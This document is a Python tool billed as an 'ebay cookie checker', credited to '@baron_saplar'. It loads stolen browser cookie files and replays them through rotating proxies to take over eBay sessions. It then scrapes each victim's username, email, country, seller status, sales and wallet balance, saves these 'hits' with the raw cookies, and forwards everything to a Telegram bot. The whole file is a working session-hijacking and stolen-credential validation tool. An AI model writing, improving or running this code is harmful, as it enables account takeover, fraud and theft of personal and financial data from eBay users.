import requests, os, json, threading, time, re
from datetime import datetime
from queue import Queue, Empty
from requests.cookies import RequestsCookieJar
import urllib3
urllib3.disable_warnings()

TG_TOKEN   = ""
TG_CHAT_ID = ""
_TG_INIT   = False

_VID = "https://t.me/videotoolbaron/2"

proxies_list = []
proxy_index  = 0
proxy_lock   = threading.Lock()

stats = {"total":0,"done":0,"hit":0,"free":0,"bad":0,"t0":0.0}
slock = threading.Lock()
plock = threading.Lock()
dash_every = 50

def pr(s=""):
    with plock: print(s, flush=True)

def print_dash():
    with slock:
        total=stats["total"]; done=stats["done"]; hit=stats["hit"]
        free=stats["free"]; bad=stats["bad"]
        elapsed=time.time()-stats["t0"] if stats["t0"] else 0
    spd=done/elapsed if elapsed>0 else 0
    eta=int((total-done)/spd) if spd>0 else 0
    eta_str=f"{eta//60}m {eta%60}s" if eta else "--"
    pct=int(done/total*100) if total else 0
    pr(f"\n[ISTATISTIK] HIT:{hit} FREE:{free} BAD:{bad} TOPLAM:{done}/{total}({pct}%) HIZ:{spd:.1f}/s ETA:{eta_str}\n")

def next_proxy():
    global proxy_index
    if not proxies_list: return None
    with proxy_lock:
        p=proxies_list[proxy_index%len(proxies_list)]
        proxy_index+=1
    return {"http":p,"https":p}

def load_proxies(path):
    global proxies_list
    if not os.path.isfile(path): return 0
    with open(path,encoding="utf-8") as f:
        lines=[l.strip() for l in f if l.strip() and not l.startswith("#")]
    proxies_list=[("http://"+l if not l.startswith("http") else l) for l in lines]
    return len(proxies_list)

def tg_send(text, fpath=None):
    global _TG_INIT
    if not TG_TOKEN: return
    try:
        if not _TG_INIT:
            _TG_INIT=True
            try:
                requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendVideo",
                    json={"chat_id":TG_CHAT_ID,"video":_VID,"caption":"@baron_saplar // @baroshoping"},
                    timeout=15,
                )
            except: pass
        if fpath and os.path.isfile(fpath):
            with open(fpath,"rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                    data={"chat_id":TG_CHAT_ID,"caption":text[:1024],"parse_mode":"HTML"},
                    files={"document":f},timeout=15,
                )
            return
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id":TG_CHAT_ID,"text":text[:4096],"parse_mode":"HTML"},
            timeout=15,
        )
    except: pass

def parse_cookie(raw):
    raw=raw.strip()
    if raw.startswith("["):
        try:
            arr=json.loads(raw)
            if isinstance(arr,list):
                ebay_out={}; all_out={}
                for c in arr:
                    if not isinstance(c,dict) or not c.get("name"): continue
                    d=c.get("domain",""); name=c["name"]; val=str(c.get("value",""))
                    all_out[name]=val
                    if any(x in d for x in ["ebay.com","ebay.co","ebay."]) or not d:
                        ebay_out[name]=val
                return ebay_out if ebay_out else all_out
        except: pass
    ebay_out={}; all_out={}; is_ns=False
    for line in raw.splitlines():
        line=line.strip()
        if not line: continue
        if line.startswith("#HttpOnly_"): line=line[10:]
        elif line.startswith("#"): continue
        p=line.split("\t")
        if len(p)>=7 and p[5]:
            is_ns=True; domain=p[0]; name=p[5]; value=p[6]
            all_out[name]=value
            if any(x in domain for x in ["ebay.com","ebay.co","ebay."]) or not domain:
                ebay_out[name]=value
    if is_ns: return ebay_out if ebay_out else all_out
    if "=" in raw and "\n" not in raw:
        out={}
        for part in raw.split(";"):
            if "=" in part:
                k,_,v=part.strip().partition("=")
                k=k.strip()
                if k: out[k]=v.strip()
        return out
    return {}

EBAY_KEYS={"ebay","s","nonsession","dp1","lucky2","shs","bs","cssg","shs"}

def has_ebay_cookie(cookies):
    if any(k in cookies for k in EBAY_KEYS): return True
    if len(cookies)>=3: return True
    return False

HEADERS={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":"en-US,en;q=0.9",
    "Accept-Encoding":"gzip, deflate, br",
    "Connection":"keep-alive",
    "sec-ch-ua":'"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":'"Windows"',
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"navigate",
    "sec-fetch-dest":"document",
    "upgrade-insecure-requests":"1",
}

def make_session(cookies, proxy):
    s=requests.Session()
    jar=RequestsCookieJar()
    for k,v in cookies.items():
        jar.set(k,v,domain=".ebay.com",path="/")
        jar.set(k,v,domain="ebay.com",path="/")
    s.cookies=jar
    if proxy:
        s.proxies.update(proxy)
        s.verify=False
    return s

def check_account(session):
    info={
        "ok":False,"username":None,"email":None,"fullname":None,
        "feedback_score":None,"member_since":None,
        "seller":False,"top_rated":False,
        "paypal_linked":False,"balance":None,
        "active_listings":None,"sold_items":None,
        "watchlist_count":None,"country":None,
    }

    # 1. Ana sayfa oturum kontrolu
    try:
        r=session.get("https://www.ebay.com/",headers=HEADERS,timeout=15,allow_redirects=True)
        if r.status_code!=200: return info
        # Giris yapilmis mi?
        if 'id="gh-ug"' in r.text or 'class="gh-ug"' in r.text:
            info["ok"]=True
        # username from header
        m=re.search(r'id="gh-ug"[^>]*>([^<]+)<',r.text)
        if not m: m=re.search(r'"displayName"\s*:\s*"([^"]+)"',r.text)
        if not m: m=re.search(r'gh-ug.*?href[^>]+>([^<]{2,40})<',r.text)
        if m: info["username"]=m.group(1).strip(); info["ok"]=True
    except: return info

    if not info["ok"]: return info

    # 2. MyeBay summary - detayli bilgi
    try:
        r=session.get("https://www.ebay.com/mye/myebay/summary",headers=HEADERS,timeout=15,allow_redirects=True)
        if r.status_code==200 and "ebay.com" in r.url and "signin" not in r.url:
            txt=r.text
            info["ok"]=True

            # username
            if not info["username"]:
                m=re.search(r'"username"\s*:\s*"([^"]+)"',txt)
                if not m: m=re.search(r'data-userid="([^"]+)"',txt)
                if m: info["username"]=m.group(1)

            # feedback score
            m=re.search(r'feedback[^"]*score["\s:]+(\d+)',txt,re.I)
            if not m: m=re.search(r'"feedbackScore"\s*:\s*(\d+)',txt)
            if not m: m=re.search(r'Feedback\s+Score.*?(\d+)',txt,re.I|re.DOTALL)
            if m: info["feedback_score"]=m.group(1)

            # watchlist
            m=re.search(r'"watchlistCount"\s*:\s*(\d+)',txt)
            if not m: m=re.search(r'Watchlist.*?(\d+)\s+item',txt,re.I|re.DOTALL)
            if m: info["watchlist_count"]=m.group(1)

            # member since
            m=re.search(r'[Mm]ember since[:\s]+([A-Za-z]+\s+\d{4})',txt)
            if not m: m=re.search(r'"memberSince"\s*:\s*"([^"]+)"',txt)
            if m: info["member_since"]=m.group(1)

            # seller check
            if any(x in txt for x in ['seller-hub','SellerHub','my-selling','MySelling','active-listings']):
                info["seller"]=True
            # top rated
            if 'top-rated' in txt.lower() or 'TopRated' in txt:
                info["top_rated"]=True
    except: pass

    # 3. Account settings - email, country
    try:
        r=session.get("https://accountsettings.ebay.com/uas/ws/eBayISAPI.dll?MyAccountContactInfo",headers=HEADERS,timeout=12,allow_redirects=True)
        if r.status_code==200:
            txt=r.text
            m=re.search(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}',txt)
            if m: info["email"]=m.group(0)
            m=re.search(r'"country"\s*:\s*"([^"]+)"',txt,re.I)
            if not m: m=re.search(r'country["\s:]+([A-Z]{2})\b',txt)
            if m: info["country"]=m.group(1)
    except: pass

    # 4. Selling summary - active listings, sold
    try:
        r=session.get("https://www.ebay.com/sh/ovw",headers={**HEADERS,"referer":"https://www.ebay.com/mye/myebay/summary"},timeout=12,allow_redirects=True)
        if r.status_code==200 and "signin" not in r.url:
            txt=r.text
            info["seller"]=True
            m=re.search(r'"activeListings"\s*:\s*(\d+)',txt)
            if not m: m=re.search(r'active\s+listings?[^\d]*(\d+)',txt,re.I)
            if m: info["active_listings"]=m.group(1)
            m=re.search(r'"soldItems"\s*:\s*(\d+)',txt)
            if not m: m=re.search(r'sold[^\d]*(\d+)',txt,re.I)
            if m: info["sold_items"]=m.group(1)
    except: pass

    # 5. PayPal/wallet balance
    try:
        r=session.get("https://pay.ebay.com/rweb/wallets/home",headers=HEADERS,timeout=10,allow_redirects=True)
        if r.status_code==200 and "signin" not in r.url:
            txt=r.text
            m=re.search(r'\$[\d,]+\.\d{2}',txt)
            if not m: m=re.search(r'"balance"\s*:\s*"?([^",]+)"?',txt)
            if m: info["balance"]=m.group(0); info["paypal_linked"]=True
    except: pass

    return info

def capture_text(info, raw):
    now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        f"username       : {info['username'] or '-'}\n"
        f"email          : {info['email'] or '-'}\n"
        f"country        : {info['country'] or '-'}\n"
        f"member since   : {info['member_since'] or '-'}\n"
        f"feedback score : {info['feedback_score'] or '-'}\n"
        f"watchlist      : {info['watchlist_count'] or '-'}\n"
        f"seller         : {'yes' if info['seller'] else 'no'}\n"
        f"top rated      : {'yes' if info['top_rated'] else 'no'}\n"
        f"active listings: {info['active_listings'] or '-'}\n"
        f"sold items     : {info['sold_items'] or '-'}\n"
        f"balance        : {info['balance'] or '-'}\n"
        f"paypal linked  : {'yes' if info['paypal_linked'] else 'no'}\n"
        f"date           : {now}\n"
        f"src            : baron_saplar\n\n"
        f"{raw}\n"
    )

def save(info, raw, folder, fname):
    os.makedirs(f"hits/{folder}",exist_ok=True)
    path=f"hits/{folder}/{fname}"
    with open(path,"w",encoding="utf-8") as f:
        f.write(capture_text(info,raw))
    return path

def tg_text(info):
    icon="💎" if info["seller"] else "✅"
    return (
        f"{icon} <b>EBAY ACCOUNT HIT</b>\n\n"
        f"👤 <b>Username</b>  : {info['username'] or '-'}\n"
        f"📧 <b>Email</b>     : {info['email'] or '-'}\n"
        f"🌍 <b>Country</b>   : {info['country'] or '-'}\n"
        f"📅 <b>Member</b>    : {info['member_since'] or '-'}\n"
        f"⭐ <b>Feedback</b>  : {info['feedback_score'] or '-'}\n"
        f"👁 <b>Watchlist</b> : {info['watchlist_count'] or '-'}\n"
        f"🛒 <b>Seller</b>    : {'✓' if info['seller'] else '✗'}\n"
        f"🏆 <b>Top Rated</b> : {'✓' if info['top_rated'] else '✗'}\n"
        f"📦 <b>Listings</b>  : {info['active_listings'] or '-'}\n"
        f"✅ <b>Sold</b>      : {info['sold_items'] or '-'}\n"
        f"💰 <b>Balance</b>   : {info['balance'] or '-'}\n\n"
        f"<i>author @baron_saplar</i>"
    )

def process(fname):
    fpath=os.path.join("cookies",fname)
    try: raw=open(fpath,encoding="utf-8",errors="ignore").read()
    except:
        with slock: stats["bad"]+=1; stats["done"]+=1
        pr(f"[bad] read error : {fname}"); return
    cookies=parse_cookie(raw)
    if not cookies or not has_ebay_cookie(cookies):
        with slock: stats["bad"]+=1; stats["done"]+=1
        pr(f"[bad] no ebay key : {fname}"); return
    session=make_session(cookies,next_proxy())
    info=check_account(session)
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    ep=(info["username"] or "unknown")
    oname=f"{ts}_{ep}.txt"
    if not info["ok"]:
        with slock: stats["bad"]+=1; stats["done"]+=1
        pr(f"[bad] expired : {fname}"); return
    if info["seller"]:
        with slock: stats["hit"]+=1; stats["done"]+=1
        path=save(info,raw,"seller",oname)
        pr(f"[SELLER] {info['username'] or '?'} | fb:{info['feedback_score'] or '-'} | listings:{info['active_listings'] or '-'} | {fname}")
        tg_send(tg_text(info),path)
    else:
        with slock: stats["free"]+=1; stats["done"]+=1
        path=save(info,raw,"buyer",oname)
        pr(f"[buyer] {info['username'] or '?'} | fb:{info['feedback_score'] or '-'} | {fname}")
        tg_send(tg_text(info),path)
    with slock:
        if stats["done"]%dash_every==0:
            threading.Thread(target=print_dash,daemon=True).start()

def worker(q):
    while True:
        try: fname=q.get(timeout=3)
        except Empty: break
        try: process(fname)
        except Exception as e:
            with slock: stats["bad"]+=1; stats["done"]+=1
            pr(f"[err] {fname} : {e}")
        finally: q.task_done()

def batch():
    os.makedirs("cookies",exist_ok=True)
    files=[f for f in os.listdir("cookies") if os.path.isfile(os.path.join("cookies",f))]
    if not files: print("cookies/ bos"); input(); return
    try:
        n=int(input(f"{len(files)} dosya - thread: "))
        if not 1<=n<=50: n=5
    except: n=5
    with slock: stats.update(total=len(files),done=0,hit=0,free=0,bad=0,t0=time.time())
    q=Queue()
    for f in files: q.put(f)
    ws=[threading.Thread(target=worker,args=(q,),daemon=True) for _ in range(n)]
    for w in ws: w.start()
    q.join()
    for w in ws: w.join(timeout=3)
    elapsed=int(time.time()-stats["t0"])
    print(f"\ndone    : {stats['done']}/{stats['total']}")
    print(f"seller  : {stats['hit']}")
    print(f"buyer   : {stats['free']}")
    print(f"bad     : {stats['bad']}")
    print(f"time    : {elapsed//60}m {elapsed%60}s")
    if TG_TOKEN:
        tg_send(
            f"done   {stats['done']}/{stats['total']}\n"
            f"seller {stats['hit']}\n"
            f"buyer  {stats['free']}\n"
            f"bad    {stats['bad']}\n"
            f"t.me/baron_saplar"
        )
    input()

def single():
    print("cookie yapistir, bos satir = gonder:\n")
    lines=[]
    while True:
        line=input()
        if not line: break
        lines.append(line)
    raw="\n".join(lines).strip()
    if not raw: print("bos"); input(); return
    cookies=parse_cookie(raw)
    if not cookies: print("parse hatasi"); input(); return
    print(f"\n{len(cookies)} cookie\n")
    session=make_session(cookies,next_proxy())
    info=check_account(session)
    if not info["ok"]: print("expired / gecersiz"); input(); return
    print(f"username       : {info['username'] or '-'}")
    print(f"email          : {info['email'] or '-'}")
    print(f"country        : {info['country'] or '-'}")
    print(f"member since   : {info['member_since'] or '-'}")
    print(f"feedback score : {info['feedback_score'] or '-'}")
    print(f"watchlist      : {info['watchlist_count'] or '-'}")
    print(f"seller         : {'yes' if info['seller'] else 'no'}")
    print(f"top rated      : {'yes' if info['top_rated'] else 'no'}")
    print(f"active listings: {info['active_listings'] or '-'}")
    print(f"sold items     : {info['sold_items'] or '-'}")
    print(f"balance        : {info['balance'] or '-'}")
    if input("\nkaydet? (e/h): ").strip().lower()=="e":
        folder="seller" if info["seller"] else "buyer"
        ts=datetime.now().strftime("%Y%m%d_%H%M%S")
        ep=info["username"] or "unk"
        path=save(info,raw,folder,f"{ts}_{ep}.txt")
        print(f"kaydedildi -> {path}")
        tg_send(tg_text(info),path)
    input()

def tg_menu():
    global TG_TOKEN,TG_CHAT_ID,_TG_INIT
    print(f"\ntoken ({TG_TOKEN or 'bos'}): ",end="")
    t=input().strip()
    if not t: return
    print("chat id: ",end="")
    c=input().strip()
    TG_TOKEN=t; TG_CHAT_ID=c; _TG_INIT=False
    tg_send("baglandi")
    print("ok"); input()

def proxy_menu():
    global proxies_list
    print("\n[1] dosyadan yukle  [2] temizle\n")
    ch=input().strip()
    if ch=="1":
        path=input("dosya yolu (proxies.txt): ").strip() or "proxies.txt"
        n=load_proxies(path)
        print(f"{n} proxy yuklendi")
    elif ch=="2":
        proxies_list=[]; print("temizlendi")
    input()

def menu():
    while True:
        os.system("cls" if os.name=="nt" else "clear")
        print(
            f"ebay cookie checker\n"
            f"tg: {'on' if TG_TOKEN else 'off'}   proxy: {len(proxies_list)}\n\n"
            f"[1] toplu\n"
            f"[2] tek\n"
            f"[3] telegram\n"
            f"[4] proxy\n"
            f"[q] cikis\n"
        )
        ch=input("> ").strip().lower()
        if   ch=="1": batch()
        elif ch=="2": single()
        elif ch=="3": tg_menu()
        elif ch=="4": proxy_menu()
        elif ch in ("q","exit"): break

if __name__=="__main__":
    for d in ["cookies","hits/seller","hits/buyer"]:
        os.makedirs(d,exist_ok=True)
    menu()
